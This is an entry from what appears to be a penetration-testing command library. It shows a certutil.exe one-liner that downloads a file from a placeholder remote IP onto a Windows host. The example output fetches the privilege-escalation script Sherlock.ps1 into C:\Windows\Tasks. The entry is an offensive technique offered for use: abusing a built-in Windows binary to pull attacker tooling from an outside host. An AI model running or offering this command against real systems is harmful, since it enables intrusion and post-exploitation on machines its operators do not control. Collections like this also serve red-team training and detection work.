---
id: 44b5cb18-b166-455a-a4b2-5827fc1ea622
name: Download from a Remote HTTP Server (certutil)
type: command
executor: command_prompt
data: certutil.exe -urlcache -split -f "http://$_REMOTE_IP/$_FILENAME" "$_PATH/$_FILENAME"
output: "C:\\>certutil.exe -urlcache -split -f \"http://10.10.10.100/Sherlock.ps1\"\
  \ \"C:\\Windows\\Tasks\\Sherlock.ps1\"\n****  Online  ****\n  0000  ...\n  4117\n\
  CertUtil: -URLCache command completed successfully."
created_at: '2019-11-25T22:00:53.902277+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Download from a Remote HTTP Server (certutil)

```command_prompt
certutil.exe -urlcache -split -f "http://$_REMOTE_IP/$_FILENAME" "$_PATH/$_FILENAME"
```

## Expected Output

```
C:\>certutil.exe -urlcache -split -f "http://10.10.10.100/Sherlock.ps1" "C:\Windows\Tasks\Sherlock.ps1"
****  Online  ****
  0000  ...
  4117
CertUtil: -URLCache command completed successfully.
```
